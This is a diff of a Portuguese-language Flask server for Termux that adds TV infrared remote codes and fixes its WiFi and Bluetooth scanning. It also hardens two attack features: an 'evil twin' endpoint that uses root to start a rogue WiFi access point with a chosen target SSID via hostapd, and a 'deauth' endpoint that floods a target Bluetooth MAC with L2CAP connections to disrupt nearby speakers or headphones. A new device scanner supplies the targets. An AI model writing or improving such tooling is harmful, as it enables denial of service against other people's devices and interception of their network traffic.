@@ -4,13 +4,13 @@ Roda no Termux com: python server.py
 Acesse no navegador: http://<seu-IP>:8080
 
 Requer:
-  pkg install python termux-api
+  pkg install python termux-api bluetoothctl
   pip install flask
   (Instale o app Termux:API na Play Store também)
 """
 
 import json
-import os
+import re
 import socket
 import subprocess
 import threading
@@ -24,19 +24,21 @@ app = Flask(__name__)
 # ─────────────────────────────────────────────
 
 def run_cmd(cmd, timeout=15):
-    """Executa comando shell e retorna stdout/stderr."""
+    """Executa comando shell e retorna stdout/stderr.
+    NÃO verifica returncode — alguns comandos retornam 1 mas têm saída válida.
+    """
     try:
         result = subprocess.run(
             cmd, shell=True, capture_output=True,
             text=True, timeout=timeout
         )
-        return {"ok": result.returncode == 0,
-                "out": result.stdout.strip(),
-                "err": result.stderr.strip()}
+        out = result.stdout.strip()
+        err = result.stderr.strip()
+        return {"ok": True, "out": out, "err": err, "code": result.returncode}
     except subprocess.TimeoutExpired:
-        return {"ok": False, "out": "", "err": "Timeout"}
+        return {"ok": False, "out": "", "err": "Timeout", "code": -1}
     except Exception as e:
-        return {"ok": False, "out": "", "err": str(e)}
+        return {"ok": False, "out": "", "err": str(e), "code": -1}
 
 
 def get_local_ip():
@@ -68,12 +70,13 @@ def status():
 #  IR REMOTE
 # ─────────────────────────────────────────────
 
-# Códigos NEC pré-definidos para TVs populares
 IR_CODES = {
     "samsung_power":    {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,47250"},
     "samsung_vol_up":   {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,560,560,1690,560,1690,560,47250"},
     "samsung_vol_down": {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,1690,560,560,560,560,560,560,560,1690,560,560,560,560,560,1690,560,560,560,1690,560,1690,560,1690,560,560,560,1690,560,1690,560,47250"},
+    "samsung_mute":     {"freq": 38000, "pattern": "4500,4500,560,560,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,1690,560,560,560,1690,560,1690,560,1690,560,560,560,1690,560,1690,560,47250"},
     "lg_power":         {"freq": 38000, "pattern": "9000,4500,560,560,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,47250"},
+    "lg_vol_up":        {"freq": 38000, "pattern": "9000,4500,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,1690,560,47250"},
     "sony_power":       {"freq": 40000, "pattern": "2400,600,1200,600,600,600,1200,600,600,600,600,600,1200,600,600,600,600,600,600,600,600,600,600,600,47250"},
     "philips_power":    {"freq": 36000, "pattern": "889,889,889,2667,889,889,889,889,889,2667,889,889,889,889,889,889,889,889,889,2667,889,47250"},
 }
@@ -98,14 +101,19 @@ def ir_send():
 
     cmd = f"termux-infrared-transmit -f {freq} {pattern}"
     result = run_cmd(cmd, timeout=10)
-    return jsonify(result)
+
+    # termux-infrared-transmit retorna nada no stdout em caso de sucesso
+    if result["code"] == 0 or (not result["err"]):
+        return jsonify({"ok": True, "out": "Sinal enviado"})
+    return jsonify({"ok": False, "err": result["err"] or "Falha ao enviar IR"})
 
 @app.route("/api/ir/check")
 def ir_check():
-    result = run_cmd("termux-infrared-frequencies", timeout=5)
-    if result["ok"] and result["out"]:
-        return jsonify({"ok": True, "frequencies": result["out"]})
-    return jsonify({"ok": False, "err": "IR não suportado ou Termux:API não instalado"})
+    result = run_cmd("termux-infrared-frequencies", timeout=8)
+    out = result["out"]
+    if out and "[" in out:
+        return jsonify({"ok": True, "frequencies": out})
+    return jsonify({"ok": False, "err": "IR não suportado ou Termux:API não instalado. Instale o app Termux:API da Play Store e permita acesso ao IR."})
 
 
 # ─────────────────────────────────────────────
@@ -114,63 +122,76 @@ def ir_check():
 
 @app.route("/api/wifi/scan")
 def wifi_scan():
-    result = run_cmd("termux-wifi-scaninfo", timeout=20)
-    if result["ok"] and result["out"]:
-        try:
-            networks = json.loads(result["out"])
+    # BUG CORRIGIDO: não checa result["ok"] porque termux-wifi-scaninfo
+    # pode retornar código 1 mas ainda assim ter saída JSON válida.
+    result = run_cmd("termux-wifi-scaninfo", timeout=25)
+    out = result["out"]
+
+    # Às vezes a saída vem no stderr
+    if not out:
+        out = result["err"]
+
+    if not out:
+        return jsonify({
+            "ok": False,
+            "err": "Sem resposta do termux-wifi-scaninfo",
+            "tip": "Verifique: 1) App Termux:API instalado  2) Permissão de Localização concedida ao Termux nas Configurações do Android  3) WiFi ligado"
+        })
+
+    # Tenta parsear JSON
+    try:
+        networks = json.loads(out)
+        if isinstance(networks, list):
             return jsonify({"ok": True, "networks": networks})
-        except json.JSONDecodeError:
-            return jsonify({"ok": False, "err": "Falha ao parsear resultado", "raw": result["out"]})
-    return jsonify({"ok": False, "err": result["err"] or "Sem resultado. Instale Termux:API"})
+        # Pode ser dict com campo de erro
+        if isinstance(networks, dict) and "error" in networks:
+            return jsonify({"ok": False, "err": networks["error"], "tip": "Verifique permissão de Localização no Android"})
+        return jsonify({"ok": True, "networks": [networks]})
+    except json.JSONDecodeError:
+        # Saída não é JSON — pode ser mensagem de erro do termux-api
+        return jsonify({
+            "ok": False,
+            "err": out[:200],
+            "tip": "Instale o app 'Termux:API' da Play Store e conceda permissão de Localização ao Termux"
+        })
 
 @app.route("/api/wifi/info")
 def wifi_info():
     result = run_cmd("termux-wifi-connectioninfo", timeout=10)
-    if result["ok"] and result["out"]:
+    out = result["out"] or result["err"]
+    if out:
         try:
-            info = json.loads(result["out"])
+            info = json.loads(out)
             return jsonify({"ok": True, "info": info})
         except Exception:
-            return jsonify({"ok": False, "err": "Falha ao parsear"})
-    return jsonify({"ok": False, "err": result["err"]})
+            return jsonify({"ok": False, "err": out[:200]})
+    return jsonify({"ok": False, "err": "Sem resposta"})
 
 @app.route("/api/wifi/evil_twin", methods=["POST"])
 def wifi_evil_twin():
-    """
-    Evil Twin requer root + hostapd + dnsmasq.
-    No Termux sem root, apenas explica como configurar com termux-hotspot ou hostapd.
-    """
     data = request.json or {}
     ssid = data.get("ssid", "FreeWiFi")
 
-    # Verifica se tem root
     root_check = run_cmd("su -c 'echo ROOT_OK'", timeout=5)
-    has_root = root_check["ok"] and "ROOT_OK" in root_check["out"]
+    has_root = "ROOT_OK" in root_check["out"]
 
     if not has_root:
         return jsonify({
             "ok": False,
             "err": "Root necessário para criar Evil Twin",
-            "tip": f"Com root: instale hostapd e dnsmasq via pkg, e configure SSID '{ssid}'"
+            "tip": f"Com root, instale: pkg install hostapd dnsmasq  —  SSID alvo: '{ssid}'"
         })
 
-    # Com root: tenta criar AP via hostapd
-    hostapd_conf = f"""
-interface=wlan0
-driver=nl80211
-ssid={ssid}
-hw_mode=g
-channel=6
-macaddr_acl=0
-auth_algs=1
-ignore_broadcast_ssid=0
-"""
-    conf_path = "/data/data/com.termux/files/home/hostapd.conf"
+    hostapd_conf = (
+        f"interface=wlan0\ndriver=nl80211\nssid={ssid}\n"
+        "hw_mode=g\nchannel=6\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"
+    )
+    conf_path = "/data/data/com.termux/files/home/hostapd_phantom.conf"
     with open(conf_path, "w") as f:
         f.write(hostapd_conf)
 
     result = run_cmd(f"su -c 'hostapd {conf_path} &'", timeout=5)
-    return jsonify({"ok": True, "msg": f"AP '{ssid}' iniciado (requer hostapd instalado)", "detail": result})
+    return jsonify({"ok": True, "msg": f"AP '{ssid}' iniciado", "detail": result["out"]})
 
 
 # ─────────────────────────────────────────────
@@ -181,7 +202,6 @@ bt_flood_active = False
 bt_flood_thread = None
 
 def _l2cap_flood(target_mac, duration, results):
-    """Envia conexões L2CAP PSM 1 repetidamente para o alvo."""
     global bt_flood_active
     end_time = time.time() + duration
     count = 0
@@ -196,47 +216,114 @@ def _l2cap_flood(target_mac, duration, results):
             count += 1
         except Exception:
             errors += 1
-            # Erros são esperados — o alvo rejeita conexões mas fica sobrecarregado
         time.sleep(0.05)
 
     results["count"] = count
     results["errors"] = errors
     bt_flood_active = False
 
+
+def _scan_bluetooth_devices():
+    """
+    BUG CORRIGIDO: bluetoothctl scan interativo com timeout real.
+    Abre bluetoothctl como processo interativo, escaneia por 8s, encerra e
+    retorna lista de devices como [{"mac": ..., "name": ...}].
+    """
+    devices = {}
+
+    try:
+        proc = subprocess.Popen(
+            ["bluetoothctl"],
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1
+        )
+
+        # Lê saída em thread separada para não travar
+        output_lines = []
+        def reader():
+            for line in proc.stdout:
+                output_lines.append(line)
+
+        t = threading.Thread(target=reader, daemon=True)
+        t.start()
+
+        # Liga scan
+        proc.stdin.write("scan on\n")
+        proc.stdin.flush()
+
+        # Aguarda 8 segundos capturando devices
+        time.sleep(8)
+
+        # Desliga scan e lista devices
+        proc.stdin.write("scan off\ndevices\nquit\n")
+        proc.stdin.flush()
+
+        # Aguarda encerrar (máx 4s)
+        try:
+            proc.wait(timeout=4)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+
+        t.join(timeout=2)
+
+        # Parseia linhas
+        for line in output_lines:
+            # Formato: "[NEW] Device AA:BB:CC:DD:EE:FF Nome"
+            # ou:      "Device AA:BB:CC:DD:EE:FF Nome"
+            m = re.search(r'Device\s+([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+(.*)', line)
+            if m:
+                mac = m.group(1).strip()
+                name = m.group(2).strip() or "Desconhecido"
+                # Remove lixo do bluetoothctl (códigos ANSI)
+                name = re.sub(r'\x1b\[[0-9;]*m', '', name).strip()
+                if mac not in devices:
+                    devices[mac] = name
+
+    except FileNotFoundError:
+        # bluetoothctl não instalado
+        return None, "bluetoothctl não encontrado. Instale: pkg install bluez"
+    except Exception as e:
+        return None, str(e)
+
+    device_list = [{"mac": mac, "name": name} for mac, name in devices.items()]
+    return device_list, None
+
+
 @app.route("/api/bt/scan")
 def bt_scan():
-    result = run_cmd("termux-bluetooth-get-adapters", timeout=5)
-    devices_result = run_cmd(
-        "termux-bluetooth-scanmode scannable; sleep 8; termux-bluetooth-get-adapters",
-        timeout=15
-    )
-    # Tenta via bluetoothctl também
-    bctl = run_cmd("bluetoothctl -- scan on & sleep 8 && bluetoothctl -- devices", timeout=20)
+    # BUG CORRIGIDO: scan real com bluetoothctl interativo + timeout definido
+    device_list, error = _scan_bluetooth_devices()
+
+    if error:
+        return jsonify({"ok": False, "err": error, "devices": []})
+
     return jsonify({
         "ok": True,
-        "adapters": result["out"],
-        "scan": bctl["out"] or devices_result["out"],
-        "tip": "Dispositivos visíveis no modo discoverable"
+        "devices": device_list,
+        "count": len(device_list),
+        "tip": "Coloque o dispositivo alvo em modo visível (discoverable) para aparecer aqui"
     })
+
 
 @app.route("/api/bt/deauth", methods=["POST"])
 def bt_deauth():
     global bt_flood_active, bt_flood_thread
 
     data = request.json or {}
-    target = data.get("mac", "").strip()
-    duration = int(data.get("duration", 30))
+    target = data.get("mac", "").strip().upper()
+    duration = max(5, min(120, int(data.get("duration", 30))))
 
     if not target:
-        return jsonify({"ok": False, "err": "MAC do alvo obrigatório (ex: AA:BB:CC:DD:EE:FF)"}), 400
+        return jsonify({"ok": False, "err": "MAC obrigatório (ex: AA:BB:CC:DD:EE:FF)"}), 400
 
     if bt_flood_active:
-        return jsonify({"ok": False, "err": "Flood já em andamento. Pare primeiro."}), 400
+        return jsonify({"ok": False, "err": "Flood já em andamento. Clique em PARAR primeiro."}), 400
 
-    # Valida MAC
-    mac_parts = target.split(":")
-    if len(mac_parts) != 6:
-        return jsonify({"ok": False, "err": "MAC inválido"}), 400
+    if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', target):
+        return jsonify({"ok": False, "err": f"MAC inválido: {target}"}), 400
 
     bt_flood_active = True
     results = {}
@@ -247,15 +334,16 @@ def bt_deauth():
 
     return jsonify({
         "ok": True,
-        "msg": f"L2CAP flood iniciado → {target} por {duration}s",
-        "tip": "O alto volume de requisições de conexão interfere na caixa de som/fone conectado"
+        "msg": f"L2CAP flood iniciado → {target} por {duration}s"
     })
+
 
 @app.route("/api/bt/stop", methods=["POST"])
 def bt_stop():
     global bt_flood_active
     bt_flood_active = False
     return jsonify({"ok": True, "msg": "Flood parado"})
+
 
 @app.route("/api/bt/status")
 def bt_status():
@@ -276,5 +364,6 @@ if __name__ == "__main__":
 ║  http://{ip}:8080           ║
 ║  http://localhost:8080               ║
 ╚══════════════════════════════════════╝
+Pressione Ctrl+C para encerrar.
 """)
-    app.run(host="0.0.0.0", port=8080, debug=False)
+    app.run(host="0.0.0.0", port=8080, debug=False, threaded=True)
